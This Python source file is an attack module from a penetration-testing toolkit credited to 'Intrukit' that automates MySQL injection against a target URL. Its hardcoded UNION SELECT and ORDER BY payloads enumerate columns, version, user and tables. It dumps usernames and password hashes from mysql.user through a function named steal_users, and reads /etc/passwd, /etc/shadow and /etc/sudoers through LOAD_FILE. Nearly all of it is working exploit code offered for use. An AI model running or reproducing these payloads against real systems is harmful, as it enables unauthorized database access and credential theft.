"""
Mysql

The Mysql Extractor module will attempt to identify mysql injection vulnerabilities and extract data.

"""

import requests
import sys, os
import re
from termcolor import colored

class Module:
    """
    Module Class
    """

    __title__ = 'extractor/mysql'
    __date__ = '2017-11-25'
    __rank__ = 'normal'
    __description__ = 'The module will attempt to identify mysql injection vulnerabilities and extract data.'
    __details__ = 'None'

    __author__ = 'Intrukit'

    def __init__(self, URL='http://192.168.2.186/users.php?id=FUZZ&Submit=Submit',
                 INJECTIONS='resources/wordlist/sql/injections.txt', FILENAME=None, PASSWD='/etc/passwd',
                 SHADOW='/etc/shadow', SUDOERS='/etc/sudoers', HOSTS='/etc/hosts', NETWORKS='/etc/networks'):
        """
        __init__(self, URL='http://192.168.2.186/users.php?id=FUZZ&Submit=Submit',
                 INJECTIONS='resources/wordlist/sql/injections.txt', FILENAME=None, PASSWD='/etc/passwd', 
                 SHADOW='/etc/shadow')
        
        :param URL: 
        :param INJECTIONS: 
        :param FILENAME: 
        :param PASSWD: 
        :param SHADOW: 
        :param SUDOERS: 
        :param HOSTS: 
        :param NETWORKS: 
        
        Initialize the module with the module's desired options
        """
        self.__dict__['URL'] = {"value": URL, "required": True, "description": "The URL of the target"}
        self.__dict__['INJECTIONS'] = {"value": INJECTIONS, "required": True, "description": "Injections list"}
        self.__dict__['FILENAME'] = {"value": FILENAME, "required": False, "description": "File to read"}
        self.__dict__['PASSWD'] = {"value": PASSWD, "required": False, "description": "Linux passwd file"}
        self.__dict__['SHADOW'] = {"value": SHADOW, "required": False, "description": "Linux shadow file"}
        self.__dict__['SUDOERS'] = {"value": SHADOW, "required": False, "description": "Linux sudoers file"}
        self.__dict__['HOSTS'] = {"value": HOSTS, "required": False, "description": "Linux hosts file"}
        self.__dict__['NETWORKS'] = {"value": HOSTS, "required": False, "description": "Linux networks file"}

    def run(self):
        """
        run(self)
        
        :return: 
        
        Run the module
        """
        if self.URL['value'] and self.INJECTIONS['value']:
            try:
                def start(url, dictio):
                    try:
                        print("[-] Opening injections file: " + dictio)
                        f = open(dictio, "r")
                        name = f.read().splitlines()
                        launcher(url, name)
                    except:
                        print("Failed opening file: " + dictio + "\n")

                def launcher(url, dictio):
                    injected = []

                    for x in dictio:
                        sqlinjection = x
                        injected.append(url.replace("FUZZ", sqlinjection))
                    res = injector(injected)

                    print(colored('[+] Detection results:', 'green'))
                    print("------------------")
                    for x in res:
                        print(x.split(";")[0])

                    print('\nAttempt column detection? [Y/n]')
                    k = None
                    k = wait_key()
                    if k == 'y' or k == 'Y':
                        print(colored('[+] Detect columns: ', 'green'))
                        print("-----------------")
                        res = detect_columns(url)
                        print("Number of columns: " + res)
                        res = detect_columns_names(url)

                        print("[+] Columns names found: ")
                        print("-------------------------")
                        for col in res:
                            print(col)

                    print('\nAttempt version detection? [Y/n]')
                    k = None
                    k = wait_key()
                    if k == 'y' or k == 'Y':
                        print(colored('[+] DB version: ', 'green'))
                        print("---------------")
                        detect_version(url)

                    print('\nAttempt user detection? [Y/n]')
                    k = None
                    k = wait_key()
                    if k == 'y' or k == 'Y':
                        print(colored('[+] Current USER: ', 'green'))
                        print("---------------")
                        detect_user(url)

                    print('\nAttempt table detection? [Y/n]')
                    k = None
                    k = wait_key()
                    if k == 'y' or k == 'Y':
                        print(colored('[+] Get tables names:', 'green'))
                        print("---------------------")
                        detect_table_names(url)

                    print('\nAttempt MySQL user extraction? [Y/n]')
                    k = None
                    k = wait_key()
                    if k == 'y' or k == 'Y':
                        print(colored('[+] Attempting MYSQL user extraction', 'green'))
                        print("-------------------------------------")
                        steal_users(url)

                    if self.PASSWD['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.PASSWD['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.PASSWD['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.PASSWD['value'])

                    if self.SHADOW['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.SHADOW['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.SHADOW['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.SHADOW['value'])

                    if self.SUDOERS['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.SUDOERS['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.SUDOERS['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.SUDOERS['value'])

                    if self.HOSTS['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.HOSTS['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.HOSTS['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.HOSTS['value'])

                    if self.NETWORKS['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.NETWORKS['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.NETWORKS['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.NETWORKS['value'])

                    if self.FILENAME['value']:
                        print('\nAttempt to read {}? [Y/n]'.format(self.FILENAME['value']))
                        k = None
                        k = wait_key()
                        if k == 'y' or k == 'Y':
                            message = "\n[+] Reading file: " + self.FILENAME['value']
                            print(colored(message, 'green'))
                            print("---------------------------------")
                            read_file(url, self.FILENAME['value'])

                def injector(injected):
                    errors = ['Mysql', 'error in your SQL']
                    results = []
                    for y in injected:
                        print("[-] Testing errors: " + y)
                        req = requests.get(y)
                        for x in errors:
                            if req.content.decode('utf-8').find(x) != -1:
                                res = y + ";" + x
                                results.append(res)
                    return results

                def detect_columns(url):
                    new_url = url.replace("FUZZ", "admin' order by X-- -")
                    y = 1
                    while y < 20:
                        req = requests.get(new_url.replace("X", str(y)))
                        if req.content.decode('utf-8').find("Unknown") == -1:
                            y += 1
                        else:
                            break
                    return str(y - 1)

                def detect_version(url):
                    new_url = url.replace("FUZZ", "\'%20union%20SELECT%201,CONCAT('TOK',@@version,'TOK')--%20-")
                    req = requests.get(new_url)
                    raw = req.content
                    reg = r"TOK([a-zA-Z0-9].+?)TOK+?"
                    version = re.findall(reg, req.content.decode('utf-8'))
                    for ver in version:
                        print(ver)
                    return ver

                def detect_user(url):
                    new_url = url.replace("FUZZ", "\'%20union%20SELECT%201,CONCAT('TOK',user(),'TOK')--%20-")
                    req = requests.get(new_url)
                    raw = req.content
                    reg = r"TOK([a-zA-Z0-9].+?)TOK+?"
                    users = re.findall(reg, req.content.decode('utf-8'))
                    for user in users:
                        print(user)
                    return user

                def steal_users(url):
                    new_url = url.replace("FUZZ",
                                          "1\'%20union%20SELECT%20CONCAT('TOK',user,'TOK'),CONCAT('TOK',password,'TOK')%20FROM%20mysql.user--%20-")
                    req = requests.get(new_url)
                    reg = r"TOK([\*a-zA-Z0-9].+?)TOK+?"
                    users = re.findall(reg, req.content.decode('utf-8'))
                    for user in users:
                        print(user)

                def read_file(url, filename):
                    new_url = url.replace("FUZZ",
                                          """'union SELECT 1,CONCAT("TOK",LOAD_FILE("{}"),"TOK")-- -""".format(filename))
                    req = requests.get(new_url)
                    reg = r"TOK(.+?)TOK+?"
                    files = re.findall(reg, req.content.decode('utf-8'))
                    print(req.content.decode('utf-8'))
                    for x in files:
                        if not x.find('TOK'):
                            print(x)

                def detect_table_names(url):
                    new_url = url.replace("FUZZ",
                                          "\'%20union%20SELECT%20CONCAT('TOK',table_schema,'TOK'),CONCAT('TOK',table_name,'TOK')%20FROM%20information_schema.tables%20WHERE%20table_schema%20!=%20%27mysql%27%20AND%20table_schema%20!=%20%27information_schema%27%20and%20table_schema%20!=%20%27performance_schema%27%20--%20-")
                    req = requests.get(new_url)
                    raw = req.content
                    reg = r"TOK([a-zA-Z0-9].+?)TOK+?"
                    tables = re.findall(reg, req.content.decode('utf-8'))
                    for table in tables:
                        print(table)

                def detect_columns_names(url):
                    column_names = ['username', 'user', 'name', 'pass', 'passwd', 'password', 'id', 'role', 'surname', 'address']
                    new_url = url.replace("FUZZ", "admin' group by X-- -")
                    valid_cols = []
                    for name in column_names:
                        req = requests.get(new_url.replace("X", name))
                        if req.content.decode('utf-8').find("Unknown") == -1:
                            valid_cols.append(name)
                        else:
                            pass
                    return valid_cols

                def wait_key():
                    ''' Wait for a key press on the console and return it. '''
                    result = None
                    if os.name == 'nt':
                        import msvcrt
                        result = msvcrt.getch()
                    else:
                        import termios
                        fd = sys.stdin.fileno()

                        oldterm = termios.tcgetattr(fd)
                        newattr = termios.tcgetattr(fd)
                        newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
                        termios.tcsetattr(fd, termios.TCSANOW, newattr)

                        try:
                            result = sys.stdin.read(1)
                        except IOError:
                            pass
                        finally:
                            termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)

                    return result

                start(self.URL['value'], self.INJECTIONS['value'])
            except KeyboardInterrupt:
                print("Interrupted by user")
        else:
            print("You are missing required module options. Please see: show options")

